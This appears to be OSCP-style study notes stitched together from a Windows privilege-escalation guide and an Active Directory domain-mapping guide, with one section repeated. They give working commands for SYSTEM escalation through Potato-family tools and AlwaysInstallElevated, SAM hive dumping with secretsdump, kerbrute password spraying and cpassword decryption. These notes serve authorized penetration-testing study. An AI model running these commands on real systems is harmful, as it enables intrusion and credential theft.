Get-ScheduledTask | ForEach-Object { $t = $_ [pscustomobject]@{ TaskPath=$t.TaskPath; TaskName=$t.TaskName UserId=$t.Principal.UserId; RunLevel=$t.Principal.RunLevel Actions=($t.Actions | ForEach-Object { "$($_.Execute) $($_.Arguments) [wd=$($_.WorkingDirectory)]" }) -join '; ' } } ``` ```cmd icacls "C:\Path\To\task-script.ps1" icacls "C:\Path\To" schtasks /run /tn "\FOLDER\TASK" ``` > Prove action, arguments, working directory, principal, actual trigger and effective ACL. `RunLevel Highest` means the configured principal's highest available token, not SYSTEM. `/run` success means the request was accepted; verify process/effect and last-run result.
Run keys and startup consumers ```cmd reg query HKLM\Software\Microsoft\Windows\CurrentVersion\Run reg query HKCU\Software\Microsoft\Windows\CurrentVersion\Run dir "C:\ProgramData\Microsoft\Windows\Start Menu\Programs\StartUp" dir "%APPDATA%\Microsoft\Windows\Start Menu\Programs\Startup" ``` > Need a modifiable consumed value/file plus a higher-privileged boot/logon/application trigger. A writable PATH directory matters only when a privileged consumer invokes an unqualified executable through that effective PATH.
## 8. AlwaysInstallElevated and UAC context ```cmd reg query HKLM\Software\Policies\Microsoft\Windows\Installer /v AlwaysInstallElevated reg query HKCU\Software\Policies\Microsoft\Windows\Installer /v AlwaysInstallElevated ``` Both values must be `0x1`: ```cmd msiexec.exe /quiet /qn /i C:\Path\To\PAYLOAD.msi ``` > One key or a zero value disproves the route. This is an unsafe installer policy, not a universal UAC bypass. ```cmd whoami /groups reg query HKLM\Software\Microsoft\Windows\CurrentVersion\Policies\System /v EnableLUA reg query HKLM\Software\Microsoft\Windows\CurrentVersion\Policies\System /v ConsentPromptBehaviorAdmin ``` > A UAC bypass normally elevates an already-administrative filtered token. Build/policy-specific bypasses are not a baseline path for a standard user. ## 9. Token privilege routes ```cmd whoami /priv ``` | Privilege | Required next proof | | --- | --- | | `SeImpersonatePrivilege` | Compatible privileged client/coercion, impersonation level, build/runtime/tool and process creation | | `SeAssignPrimaryTokenPrivilege` | Useful primary token plus process/quota requirements | | `SeBackupPrivilege` | Enabled privilege, backup-aware read and useful protected data | | `SeRestorePrivilege` | Restore-aware write plus privileged consumer/trigger | | `SeDebugPrivilege` | Usable target process and no protected-process barrier | | `SeLoadDriverPrivilege` | Compatible signed/loadable driver and stable exploit path | | `SeTakeOwnershipPrivilege` | Ownership change, then DACL/content control and consumer |
Impersonation-tool variants ```cmd PrintSpoofer64.exe -i -c "cmd.exe" ``` ```cmd GodPotato-NET4.exe -cmd "cmd.exe /c whoami > C:\Windows\Temp\token-proof.txt" ``` > Choose by OS build, architecture, runtime and available trigger. A privilege name alone does not select a working “Potato.” Success is a SYSTEM process/effect followed by `whoami /all`; connection/token/process errors route back to prerequisites.
Backup privilege to local credential material ```cmd reg save HKLM\SAM C:\Windows\Temp\SAM.hive reg save HKLM\SYSTEM C:\Windows\Temp\SYSTEM.hive ``` ```bash impacket-secretsdump -sam SAM.hive -system SYSTEM.hive LOCAL ``` > Use the matched hive pair. Output is local credential material, not automatic SYSTEM/domain/remote authorization; classify and validate it through the credential procedure.
## 10. Application, driver and kernel candidates ```powershell Get-ItemProperty 'HKLM:\Software\Microsoft\Windows\CurrentVersion\Uninstall\*', 'HKLM:\Software\Wow6432Node\Microsoft\Windows\CurrentVersion\Uninstall\*' -ErrorAction SilentlyContinue | Select-Object DisplayName,DisplayVersion,Publisher,InstallLocation ``` ```cmd systeminfo driverquery /v ``` > Prefer deterministic credential/permission/configuration paths. Then verify exact privileged application or driver version/configuration. Use kernel exploits last after exact build, architecture, cumulative update, mitigations, prerequisites, source and crash risk are checked. Avoid `Win32_Product`; it is slow and can trigger MSI repair. ## 11. Automated candidate generation ```cmd winPEASx64.exe log Seatbelt.exe -group=system -outputfile="C:\Windows\Temp\seatbelt-system.txt" Seatbelt.exe -group=user -q -outputfile="C:\Windows\Temp\seatbelt-user.json" ``` ```powershell powershell.exe -ExecutionPolicy Bypass -Command ". .\PrivescCheck.ps1; Invoke-PrivescCheck -Report TXT,HTML" Import-Module .\PowerUp.ps1 Invoke-AllChecks ``` > winPEAS is broad; Seatbelt is a targeted survey and publishes source rather than official binaries; PrivescCheck evaluates the current token and skips some checks when elevated; PowerUp is useful but its upstream repository was archived. AV/script-policy failure is a tooling limitation—use native checks. Convert every highlight into: ```text CANDIDATE | CURRENT TOKEN | CONTROLLED INPUT | EFFECTIVE RIGHT | CONSUMER | RUN-AS | TRIGGER | EXPECTED EFFECT | STATUS ``` ## 12. Failure router | Failure | Next action | | --- | --- | | Service config `Access is denied` | Validate service DACL/effective token; inspect binary/DLL/config alternatives | | Can modify but cannot restart | Find reliable boot/logon/service dependency trigger or choose another path | | Service error 1053 | Check bounded effect, then restore; payload may not implement the service protocol | | Unquoted path but no creatable prefix | Disprove the route | | DLL not loaded | Recheck actual request, KnownDLL/SxS/loaded module, search order, bitness and trigger | | Task accepted but no effect | Check action, conditions, working directory, LastTaskResult/history and process lifetime | | Privilege tool fails | Recheck enabled token state, build, architecture/runtime and trigger-specific prerequisite | | Hashes but no higher session | Return to credential classification and host/service authorization | | Suggester lists CVE | Verify exact component/build/patch/config and exploit source before use | | Enumerator blocked | Run the relevant native branch; do not infer no findings | ## 13. Verify, re-enumerate and preserve evidence ```cmd whoami /all hostname ipconfig /all ``` After a higher token, re-enumerate protected credentials, services, tasks, sessions, listeners, routes and domain context. Preserve the command, relevant output, trigger and restoration step. For exam use, recheck the current OffSec guide: Windows full-privilege evidence requires SYSTEM, Administrator or an account with Administrator privileges, and AI/LLM use is prohibited during the exam and report phase. ## JAWS — PowerShell enumeration when the compiled helper is unsuitable Use a reviewed JAWS script when its PowerShell-based checks fit the current host/runtime. It is an alternative survey, not proof that every current Windows configuration is covered. ```cmd powershell.exe -ExecutionPolicy Bypass -File .\jaws-enum.ps1 -OutputFilename JAWS-Enum.txt ``` Read: turn a named service, path or credential finding into its exact native check (`sc.exe qc`, `sc.exe sdshow`, `icacls`, task XML, or the file read). Policy or language restrictions can still prevent the script from running. The process-scope flag does not override an enforced policy/control layer; use the manual checks already listed here. Sources: [upstream 1](https://github.com/411Hall/JAWS). ## Legacy impersonation helpers — select by OS build and trigger Use the current GodPotato/PrintSpoofer workflow first when its conditions fit. Older JuicyPotato-family recipes depend on specific COM/DCOM/RPC behavior; an enabled token privilege alone is not the complete condition. ```cmd REM Legacy JuicyPotato: requires a working CLSID and supported Windows build JuicyPotato.exe -l 1337 -p C:\Windows\System32\cmd.exe -t * -c CLSID -a "/c whoami > C:\Windows\Temp\identity-check.txt" REM Separate EFS-triggered helper, if its documented prerequisites fit SharpEfsPotato.exe -p C:\Windows\System32\cmd.exe -a "/c whoami > C:\Windows\Temp\identity-check.txt" type C:\Windows\Temp\identity-check.txt ``` Read: verify the exact resulting token/identity and effect. CLSID/RPC/trigger errors can mean an incompatible build, service state or blocked primitive—not a wrong password. Original JuicyPotato is a legacy option and is not a universal modern-Windows escalation. Inspect each helper's local help/version; do not interchange flags across JuicyPotatoNG, GodPotato and SharpEfsPotato. Sources: [upstream 1](https://github.com/ohpe/juicy-potato) · [upstream 2](https://github.com/bugch3ck/SharpEfsPotato). ## AccessChk — verify the exact service, file or registry permission Use after WinPEAS, PrivescCheck or a manual check identifies a candidate. Query the current identity and the exact object; a writable service binary and service-configuration rights are different paths. ```cmd whoami accesschk.exe -nobanner -v -c "DOMAIN\USER" SERVICE accesschk.exe -nobanner -v "DOMAIN\USER" "C:\Path\To\PROGRAM.exe" accesschk.exe -nobanner -v -k "DOMAIN\USER" "HKLM\SYSTEM\CurrentControlSet\Services\SERVICE" :: Broader candidate discovery; retain errors rather than suppressing them accesschk.exe -nobanner -w -v -c "DOMAIN\USER" * ``` Read: `SERVICE_CHANGE_CONFIG`, `WRITE_DAC`, file modification and registry value modification enable different operations. Next inspect `sc.exe qc SERVICE`, executable/parent ACLs, service identity and a permitted restart/trigger. A write result alone does not establish SYSTEM execution. Empty write-filtered output is not a complete permission inventory; inspect the exact object without `-w` and check errors. Use the existing `sc.exe sdshow`, `icacls` and PowerShell ACL checks if AccessChk is unavailable. Sources: [upstream 1](https://learn.microsoft.com/en-us/sysinternals/downloads/accesschk). ## Sources - Supplied PEN-200, Chapter 17, pp494-549 - [OffSec OSCP+ Body of Knowledge](https://help.offsec.com/hc/en-us/articles/38543335188756-OSCP-Body-of-knowledge) - [OffSec OSCP+ Exam Guide](https://help.offsec.com/hc/en-us/articles/360040165632-OSCP-Exam-Guide) - [getSH Windows privilege escalation](https://lizajose.github.io/getSH/privesc?system=windows), source snapshot [`e1f62dd`](https://github.com/lizajose/getSH/commit/e1f62dd351bd061b59e2573beea741f6c5bb4f98) - [Hexdump Windows module](https://github.com/LeonardoE95/OSCP/tree/main/modules/windows) - [Microsoft access tokens](https://learn.microsoft.com/windows/win32/secauthz/access-tokens) - [Microsoft Mandatory Integrity Control](https://learn.microsoft.com/windows/win32/secauthz/mandatory-integrity-control) - [Microsoft service security and access rights](https://learn.microsoft.com/windows/win32/services/service-security-and-access-rights) - [Microsoft DLL search order](https://learn.microsoft.com/windows/win32/dlls/dynamic-link-library-search-order) - [Microsoft AlwaysInstallElevated policy](https://learn.microsoft.com/windows/client-management/mdm/policy-csp-applicationmanagement#msialwaysinstallwithelevatedprivileges) - [Microsoft AccessChk](https://learn.microsoft.com/sysinternals/downloads/accesschk) - [PrivescCheck](https://github.com/itm4n/PrivescCheck), [Seatbelt](https://github.com/GhostPack/Seatbelt), [PEASS-ng](https://github.com/peass-ng/PEASS-ng) - [PrintSpoofer research](https://itm4n.github.io/printspoofer-abusing-impersonate-privileges/), [GodPotato](https://github.com/BeichenDream/GodPotato)

# active directory domain mapping [← stage index](readme.md) | [ldap/kerberos baseline](../02-service-enumeration/11-ldap-kerberos.md) | [ad cheatsheet](../../cheatsheets/active-directory.md) | [master notes](../../notes/master_notes.md#active-directory-attack-reasoning) | [strategy map](../../notes/attack_strategy_map.md) | study methods: [map active directory attack paths](../../notes/methods/ad-mapping.md) > **prerequisite:** one authorized domain identity and a route to the required dc/hosts. record the source host, exact identity, domain fqdn, dns server, dc fqdn/ip and time state before interpreting failures. > > **coverage:** mapping only. spns, acls, sessions and credentials are candidate transitions; ticket requests, directory changes, credential access and remote execution belong to the later stage 06 procedures. > > **exit:** produce a ranked, manually checked map in the form `controlled identity → effective relationship → object/host → reachable service → possible new access`. ## 1. keep four maps, not one tool output ```text identity map: user/computer -> direct + nested groups -> directory rights host map: computer -> os/role -> local/remote-access rights -> sessions route map: source -> dns/kdc/dc/host -> required port/service lead map: evidence -> hypothesis -> minimum validation -> next block ``` authentication, authorization, reachability and session presence are independent. a valid ldap bind does not prove share access; smb administration on one host does not prove directory privilege; a session edge does not prove retrievable credentials. ## 2. establish identity, domain, dc, dns and time ### domain-joined windows source ```cmd whoami /all echo %userdnsdomain% echo %userdomain% echo %logonserver% nltest /dsgetdc:domain nltest /dclist:domain w32tm /query /status ``` ```powershell [system.directoryservices.activedirectory.domain]::getcurrentdomain() resolve-dnsname -type srv _ldap._tcp.dc._msdcs.domain resolve-dnsname -type srv _kerberos._tcp.domain ``` > **decisive output:** domain fqdn, dc fqdn/ip, current user sid/groups, dns srv answers and a plausible time source. `userdomain` can be a netbios label; prefer the dns domain for ldap/kerberos. ### kali/off-domain source ```bash dig +short srv _ldap._tcp.dc._msdcs.domain @dc_ip dig +short srv _kerberos._tcp.domain @dc_ip nxc smb dc_ip -d domain -u user -p 'password' ldapsearch -x -lll -h ldap://dc_host:389 -s base -b '' \ defaultnamingcontext configurationnamingcontext rootdomainnamingcontext dnshostname ``` > rootdse is a directory-server metadata object. reading it can reveal naming contexts even when anonymous subtree searches are denied. convert `corp.example` to `dc=corp,dc=example`; do not guess the base dn when rootdse can supply it.
remote windows session and double-hop caveat ```cmd whoami /all klist dir \\dc_host\sysvol ``` a supplied credential may create the remote session without being delegated onward to the dc. if local identity commands work but access to a second host fails, distinguish a winrm/powershell remoting credential-delegation problem from invalid credentials. an interactive rdp session, explicit credentials, `/netonly` network credentials or an off-domain ldap client may create a different context; always record which identity is used locally and over the network.
## 3. native windows baseline ```cmd net user /domain net user user /domain net group /domain net group "domain admins" /domain net group "group" /domain net accounts /domain nltest /domain_trusts /all_trusts net view /domain net view \\dc_host ``` these commands are broadly available but provide partial views. expand interesting users and groups individually, trace nested groups rather than assuming `memberof` is complete, and retain sids when names can collide across domains.
rsat activedirectory module, only when installed ```powershell get-command -module activedirectory get-addomain get-adforest get-addomaincontroller -filter * get-aduser -filter * -properties enabled,description,memberof,serviceprincipalname,userprincipalname,passwordlastset,lastlogondate,admincount get-adgroup -filter * -properties groupscope,groupcategory,members,description get-adgroupmember -identity 'group' -recursive get-adcomputer -filter * -properties dnshostname,operatingsystem,operatingsystemversion,serviceprincipalname,trustedfordelegation,lastlogondate get-adtrust -filter * ``` `get-ad*` cmdlets require the rsat activedirectory module. its absence on a client is normal; use adsi, ldap, powerview or an off-domain client.
## 4. built-in adsi/directorysearcher fallback ```powershell $root = [adsi]'ldap://rootdse' $base = [adsi]("ldap://" + $root.defaultnamingcontext) $searcher = new-object system.directoryservices.directorysearcher($base) $searcher.pagesize = 1000 $searcher.propertiestoload.addrange(@('samaccountname','userprincipalname','objectsid','memberof','serviceprincipalname','description','useraccountcontrol','pwdlastset','lastlogontimestamp')) $searcher.filter = '(&(objectcategory=person)(objectclass=user))' $searcher.findall() | foreach-object { $_.properties } ``` change only the filter and requested attributes for another object class: ```powershell # groups $searcher.filter = '(objectcategory=group)' $searcher.propertiestoload.clear() $searcher.propertiestoload.addrange(@('samaccountname','objectsid','member','grouptype','description')) $searcher.findall() | foreach-object { $_.properties } # computers $searcher.filter = '(objectcategory=computer)' $searcher.propertiestoload.clear() $searcher.propertiestoload.addrange(@('dnshostname','operatingsystem','operatingsystemversion','serviceprincipalname','useraccountcontrol','lastlogontimestamp')) $searcher.findall() | foreach-object { $_.properties } ``` > `pagesize = 1000` asks for paged results; without paging, the server's result-size limit can silently produce an incomplete inventory. ldap filters are data selection, not proof of access or exploitability. ## 5. authenticated ldap from kali ### discover the naming context ```bash ldapsearch -x -lll -h ldap://dc_host:389 -s base -b '' \ defaultnamingcontext configurationnamingcontext rootdomainnamingcontext dnshostname ``` ### users, groups and computers ```bash ldapsearch -x -lll -h ldap://dc_host:389 -d 'user@domain' -w \ -e pr=1000/noprompt -b 'dc=domain,dc=tld' \ '(&(objectcategory=person)(objectclass=user))' \ samaccountname userprincipalname objectsid useraccountcontrol memberof description serviceprincipalname pwdlastset lastlogontimestamp admincount ``` ```bash ldapsearch -x -lll -h ldap://dc_host:389 -d 'user@domain' -w \ -e pr=1000/noprompt -b 'dc=domain,dc=tld' \ '(objectcategory=group)' samaccountname objectsid member grouptype description ``` ```bash ldapsearch -x -lll -h ldap://dc_host:389 -d 'user@domain' -w \ -e pr=1000/noprompt -b 'dc=domain,dc=tld' \ '(objectcategory=computer)' dnshostname operatingsystem operatingsystemversion serviceprincipalname useraccountcontrol lastlogontimestamp ```
spns, trusts and gpo/ou context ```bash # spn-bearing accounts: mapping only; do not request tickets in this block. ldapsearch -x -lll -h ldap://dc_host:389 -d 'user@domain' -w \ -e pr=1000/noprompt -b 'dc=domain,dc=tld' \ '(&(objectcategory=person)(objectclass=user)(serviceprincipalname=*))' \ samaccountname serviceprincipalname memberof useraccountcontrol pwdlastset ``` ```bash # trusted-domain objects ldapsearch -x -lll -h ldap://dc_host:389 -d 'user@domain' -w \ -b 'dc=domain,dc=tld' '(objectclass=trusteddomain)' \ cn securityidentifier trustdirection trusttype trustattributes ``` ```bash # ous and gpo containers; correlate links before inferring host effect. ldapsearch -x -lll -h ldap://dc_host:389 -d 'user@domain' -w \ -e pr=1000/noprompt -b 'dc=domain,dc=tld' \ '(|(objectclass=organizationalunit)(objectclass=grouppolicycontainer))' \ distinguishedname displayname name gplink gpoptions ```
### ldap failure router | result | interpretation | next action | | --- | --- | --- | | `invalid credentials (49)` | bind identity/secret/context failed; subcodes may refine the cause | recheck upn vs `domain\user`, account state and exact secret; do not infer authorization | | `strong(er) authentication required` / confidentiality required | server policy rejects that bind/transport | use the permitted ldaps/starttls or kerberos/sasl path; do not disable protections | | `size limit exceeded` or suspiciously round count | search is incomplete | add paged results and narrow the base/filter | | referral/partial results | search crossed a naming-context boundary | query the referred domain/partition or compatible global catalog deliberately | | bind succeeds, search empty | wrong base/filter, acl filtering or genuinely no matches | verify rootdse base, test a known object and request fewer attributes | | works by ip, kerberos fails | route exists but name/spn/dns/time path is wrong | use dc fqdn, ad dns, correct realm and synchronized time | ## 6. powerview: convenient manual breadth ```powershell import-module .\powerview.ps1 get-command -module powerview get-domain get-domaincontroller get-domaintrust get-domainuser | select-object samaccountname,userprincipalname,description,memberof,serviceprincipalname get-domaingroup get-domaingroupmember -identity 'group' -recurse get-domaincomputer | select-object dnshostname,operatingsystem,operatingsystemversion get-domainuser -spn | select-object samaccountname,serviceprincipalname,memberof ``` the original powersploit repository is archived. course examples and forks may use legacy aliases such as `get-netuser`, `get-netgroup`, `get-netcomputer` or `get-netdomaintrust`. inspect `get-command`/`get-help` for the exact copy present rather than mixing generations. ## 7. shares, sysvol and netlogon ### inventory, then test the object ```cmd net view \\dc_host dir \\dc_host\sysvol dir \\dc_host\netlogon ``` ```bash nxc smb dc_ip -d domain -u user -p 'password' --shares smbclient -l //dc_ip -u 'domain/user' smbclient //dc_ip/sysvol -u 'domain/user' -c 'recurse on; ls' smbclient //dc_ip/share -u 'domain/user' ``` inside `smbclient`, use `ls`, `cd`, `get file` and a harmless approved `put` only when write validation is needed. share listing, share connection, file read and file write are separate permissions. inspect authorized readable policy/logon/deployment paths for scripts, configurations, backups, connection strings and legacy group policy preferences xml containing `cpassword`. selectively retrieve relevant files; do not bulk-copy a share merely because it is readable. a discovered secret returns to the credential-classification procedure. ## 8. service accounts and spns ```cmd setspn -q */* setspn -l account ``` ```powershell get-domainuser -spn | select-object samaccountname,serviceprincipalname,memberof,useraccountcontrol,pwdlastset ``` record `account → service class/host/port → groups → password age/encryption/delegation clues → reachable service`. an spn means the account represents a kerberos service identity; it does not mean the password is weak, the service is reachable or the account is privileged. ticket acquisition/cracking is block 11. ## 9. directory acls and effective control ```powershell get-domainobjectacl -identity target_object -resolveguids | where-object { $_.activedirectoryrights -match 'genericall|genericwrite|writedacl|writeowner|extendedright|writeproperty|self' } | select-object objectdn,identityreference,activedirectoryrights,objectacetype,acetype,isinherited,inheritancetype ``` if `identityreference` is an unresolved sid, resolve it and trace whether the controlled user reaches it through direct or nested group membership. | candidate right | possible transition to validate later | missing proof now | | --- | --- | --- | | `genericall` | broad object modification | controlled trustee, target object class, applicable deny/inheritance and useful change | | `genericwrite` / `writeproperty` | change one or more writable attributes | exact attribute/object guid and a transition that consumes it | | `writeowner` | become owner | ability to change the dacl afterward and use the resulting right | | `writedacl` | add an ace | effective write-dacl right, planned narrow ace and restoration | | `allextendedrights` / `forcechangepassword` | extended operation such as reset where applicable | object class, exact extended right and downstream usefulness | | `self` / validated write | add self/member or another validated attribute where schema permits | correct validated-write guid and target type | | gpo/ou control | affect linked computers/users | writable gpo component, effective link/scope, refresh/trigger and target placement | an ace is one rule. effective access depends on trustee/group nesting, allow/deny semantics, inheritance, object-specific guids and security descriptor scope. do not perform the modification in this mapping block. ## 10. host-access candidates ```powershell find-localadminaccess ``` ```bash nxc smb target -d domain -u user -p 'password' nxc smb target -d domain -u user -p 'password' --shares ``` `find-localadminaccess` is a broad candidate generator and can be noisy or blocked by firewall/rpc controls. validate a selected host with the service you may actually use. netexec's `(pwn3d!)` indicates administrative smb context according to that tool; it does not establish rdp, winrm, wmi/dcom or directory rights. rdp, winrm, smb/service control and wmi/dcom each have different ports, services, policies and authorization. ## 11. sessions are volatile hints ```powershell get-netsession -computername computer -verbose get-netloggedon -computername computer ``` ```cmd psloggedon.exe \\computer ``` `get-netsession` relies on workstation/session enumeration apis that modern windows may restrict. psloggedon combines registry profile evidence with `netsessionenum`; remote registry access and sufficient rights are relevant, and querying can itself create a network-session entry. therefore: - empty/denied is **inconclusive**, not proof of no users; - a session is a time-sensitive observation, not a durable acl; - a session matters only if the current identity can reach/control that host and a later credential/ticket technique applies; - session presence does not prove credentials are resident, accessible or reusable. ## 12. bloodhound: collect narrowly, rank, then validate ### current sharphound ce low-noise directory baseline that avoids contacting every workstation: ```powershell .\sharphound.exe --collectionmethods dconly --outputdirectory .\bh --zipfilename domain-dconly.zip ``` add host facts only when they can answer the next question: ```powershell .\sharphound.exe --collectionmethods localgroup --computerfile .\candidate-hosts.txt --outputdirectory .\bh --zipfilename candidate-localgroups.zip .\sharphound.exe --collectionmethods session --computerfile .\candidate-hosts.txt --loop --loopduration 00:10:00 --outputdirectory .\bh --zipfilename candidate-sessions.zip ``` sharphound with no collection flag uses its broader default, including directory data plus local-group/session attempts. `all` performs every supported method; it is not the first response to an unanswered narrow question. import the output zip into a compatible bloodhound ce deployment and verify node/edge counts and ingestion errors.
collector variants and compatibility ```powershell # inspect the actual collector before using copied syntax. .\sharphound.exe --help ``` ```bash # community linux collector; flags and output compatibility vary by release. bloodhound-python --help bloodhound-python -u user -p 'password' -d domain -ns dc_ip -dc dc_host -c all --zip ``` ```powershell # legacy/course powershell collector; use only with a compatible legacy deployment. import-module .\sharphound.ps1 invoke-bloodhound -collectionmethod all -outputdirectory .\bh -zipfilename legacy.zip ``` use the collector version intended for the bloodhound deployment. `bloodhound-python`, legacy sharphound powershell and current sharphound ce are alternatives with different schemas/features, not interchangeable command spellings.
### analyze in this order 1. mark only identities/hosts actually controlled. a low-privilege session on a host does not make the host itself fully owned. 2. inspect the controlled principal's direct and nested group memberships and outbound object-control edges. 3. inspect reachable computers where it has local admin, rdp, winrm/dcom or other applicable rights. 4. inspect high-value goals and shortest paths only as hypothesis generation. 5. classify each selected edge: - directory/static-ish: group, acl, gpo, ou, trust; - host-derived: local group or user right; - volatile: session; - route-dependent: the required host/service must be reachable now. 6. reproduce the minimum important relationship manually before handing it to block 11 or 12. ## 13. candidate ledger and path ranking ```text id | controlled principal | relationship | target | source evidence | effective? | route/service | volatility | expected transition | minimum validation | status | next block ``` rank candidates by: 1. confidence that the relationship is effective; 2. deterministic value of the resulting identity/access; 3. route and service availability; 4. stability versus volatile session timing; 5. reversibility and impact; 6. number of unsupported assumptions. prefer a validated readable share/credential clue or direct object right over a multi-edge path built from stale sessions and unreachable hosts. ## 14. failure routing | symptom | most likely layer | next test | | --- | --- | --- | | dc ip reachable, domain names fail | dns/name layer | query ad dns srv/a records; use fqdn; check source resolver | | kerberos fails while smb/ldap by ip works | name/spn/time/kdc route | fqdn, realm, clock, udp/tcp 88 and ticket state | | domain identity works locally but not from remote shell to dc | credential delegation/double hop | `klist`, sysvol access, explicit/off-domain context | | ldap bind succeeds but results are incomplete | search scope/paging/acl | rootdse base, paging, known-object query, requested attributes | | share appears but files deny access | object authorization | enter share and test exact directory/file; separate read from write | | `find-localadminaccess` returns nothing | enumeration limitation or no rights | test one evidence-backed host/service manually | | session enumeration is empty/denied | api/rights/firewall/time limitation | treat inconclusive; retry only where host access/value supports it | | bloodhound path exists but host is unreachable | route/service layer | move to [stage 07](../07-pivoting-tunneling/readme.md) before identity attacks | | bloodhound import is empty/odd | collection/schema/ingest issue | inspect collector logs/zip, domain/dns, method and version compatibility | | acl appears powerful but cannot be tied to current user | trustee/nesting/scope problem | resolve sid, nested groups, deny/inheritance and target object guid | ## 15. handoffs - spn, roastable/no-preauth candidate, useful acl/gpo right, readable secret or privileged-host credential opportunity → [identity transitions and object control](03-kerberos-and-identity-transitions.md), [credential access](02-credential-access.md), or [object control](04-object-control-adcs-and-domain-compromise.md). - password/hash/ticket plus validated host authorization → [lateral movement](05-lateral-movement.md). - required internal host/service unreachable → [pivoting and tunneling](../07-pivoting-tunneling/readme.md). - any new identity, host, route, subnet or domain → repeat the relevant mapping branches. ## tooling for this section | tool | choose it when | requirements | baseline | decisive output | failure cue | | --- | --- | --- | --- | --- | --- | | `whoami`, `net`, `nltest`, `setspn`, dns/time tools | always on a domain windows source | domain context; command availability varies | sections 2–3 and 8 | exact identity/domain/dc/group/spn facts | partial output; use ldap/adsi for breadth | | adsi/directorysearcher | rsat/powerview is absent | windows powershell/.net and dc reachability | section 4 | paged objects with requested attributes | 1000-ish limit/empty output: paging, base, filter or rights | | `ldapsearch` | off-domain/raw ldap control is useful | dc fqdn/ip, base dn, credentials for subtree queries | section 5 | successful bind and complete paged results | error 49, stronger auth, referral or size limit | | powerview | fast manual ad relationship queries | known script/version and windows powershell | section 6 | named object/group/acl/host candidates | archived/fork syntax and blocked apis require native fallback | | netexec | validate smb identity, shares or selected admin candidate | kali, route to service, credentials | `nxc smb target -d domain -u user -p 'password' --shares` | auth line, share rights, optional smb admin marker | smb result does not prove other protocols | | `smbclient` | manually inspect a specific share/object | smb route and credentials | `smbclient //target/share -u 'domain/user'` | exact list/read/write result | listing and file access can differ | | psloggedon | check one justified host for users | windows binary; remote registry/session access | `psloggedon.exe \\computer` | local-profile/network-session entries | access/remote registry limitations; query adds an artifact | | sharphound ce + bloodhound ce | graph directory/host relationships | compatible collector/deployment, dns/dc route, authorized collection | `sharphound.exe --collectionmethods dconly ...` | ingested nodes/edges and candidate paths | collection errors, stale sessions, incompatible schema | | `bloodhound-python` / ldapdomaindump | linux-side fallback/reporting | kali packages, ldap/dns route, credentials, compatible output expectations | inspect `--help`; use only the needed collection/report | directory relationships/html or bloodhound output | feature/schema differences from sharphound ce | ## kerbrute — confirm candidate names before password testing use with the real domain and reachable kdc. names generated from emails/wordlists remain candidates until verified. ```bash kerbrute userenum -d domain --dc dc_ip --delay 1000 -o valid-users.txt users.txt # a separate password test, only after reading lockout policy and attempt history kerbrute passwordspray -d domain --dc dc_ip --delay 1000 --safe \ users.txt 'password' ``` read: a valid principal is not a valid password or host access. password pre-auth failures can count toward lockout; `--safe` stops on a reported lock but does not guarantee that no lockout occurs. confirm a reported login with the relevant smb/winrm/ldap client and keep the account scope explicit. dns, time and a correct realm remain prerequisites. sources: [upstream 1](https://github.com/ropnop/kerbrute). ## rusthound-ce — a cross-platform bloodhound collector use a compatible rusthound-ce build when collecting directory relationships from linux or when a sharphound binary is unsuitable. ce output belongs in bloodhound ce, not legacy. ```bash rusthound-ce -d domain -u 'user@domain' -p 'password' -f dc_host -z # when the directory requires ldaps and the tls/name prerequisites are met rusthound-ce -d domain -u 'user@domain' -p 'password' -f dc_host --ldaps -z ``` read: import the generated archive, identify the exact useful edge and verify its underlying permission or host access. directory collection does not establish a live privileged session on a workstation. ldap/tls, dns or credential errors must be repaired before treating an incomplete graph as evidence of no path. sources: [upstream 1](https://github.com/g0h4n/rusthound-ce/blob/main/help.md). ## gpp cpassword — recover a candidate from readable sysvol xml use when an accessible preference xml contains a `cpassword` attribute. search the sysvol files actually read/downloaded with the accepted account. ```bash grep -rni 'cpassword' ./sysvol gpp-decrypt 'c_password' ``` read: keep the xml's username, host/policy scope and path beside the recovered value. old preference files can contain stale credentials. validate the matching account on a relevant service; a decrypted string is not proof of current domain or local-admin access. a modern domain need not contain these older preference secrets. sources: [upstream 1](https://www.kali.org/tools/gpp-decrypt/). ## kerberos clock skew — compare utc and use a working time source use when tickets fail with a skew error or the dc/workstation clock comparison is inconsistent. a timezone label is not the utc clock value. ```bash date -u nmap -pn -p 445 --script smb2-time dc_ip # if this dc is a confirmed reachable ntp source, correct the attack workstation sudo ntpdate -u dc_ip date -u ``` read: retry the same ticket/service request after verifying the actual utc difference. if the clock jumps back, identify the competing host/vm/time-sync source instead of repeatedly changing timezone settings. ntp silence can be filtering or an unavailable time service; sections.title: 1. Keep four maps, not one tool output
sections.search:
## 1. keep four maps, not one tool output

```text
identity map: user/computer -> direct + nested groups -> directory rights
host map:     computer -> os/role -> local/remote-access rights -> sessions
route map:    source -> dns/kdc/dc/host -> required port/service
lead map:     evidence -> hypothesis -> minimum validation -> next block
```

authentication, authorization, reachability and session presence are independent. a valid ldap bind does not prove share access; smb administration on one host does not prove directory privilege; a session edge does not prove retrievable credentials.

## 2. establish identity, domain, dc, dns and time ### domain-joined windows source ```cmd whoami /all echo %userdnsdomain% echo %userdomain% echo %logonserver% nltest /dsgetdc:domain nltest /dclist:domain w32tm /query /status ``` ```powershell [system.directoryservices.activedirectory.domain]::getcurrentdomain() resolve-dnsname -type srv _ldap._tcp.dc._msdcs.domain resolve-dnsname -type srv _kerberos._tcp.domain ``` > **decisive output:** domain fqdn, dc fqdn/ip, current user sid/groups, dns srv answers and a plausible time source. `userdomain` can be a netbios label; prefer the dns domain for ldap/kerberos. ### kali/off-domain source ```bash dig +short srv _ldap._tcp.dc._msdcs.domain @dc_ip dig +short srv _kerberos._tcp.domain @dc_ip nxc smb dc_ip -d domain -u user -p 'password' ldapsearch -x -lll -h ldap://dc_host:389 -s base -b '' \ defaultnamingcontext configurationnamingcontext rootdomainnamingcontext dnshostname ``` > rootdse is a directory-server metadata object. reading it can reveal naming contexts even when anonymous subtree searches are denied. convert `corp.example` to `dc=corp,dc=example`; do not guess the base dn when rootdse can supply it.
remote windows session and double-hop caveat ```cmd whoami /all klist dir \\dc_host\sysvol ``` a supplied credential may create the remote session without being delegated onward to the dc. if local identity commands work but access to a second host fails, distinguish a winrm/powershell remoting credential-delegation problem from invalid credentials. an interactive rdp session, explicit credentials, `/netonly` network credentials or an off-domain ldap client may create a different context; always record which identity is used locally and over the network.
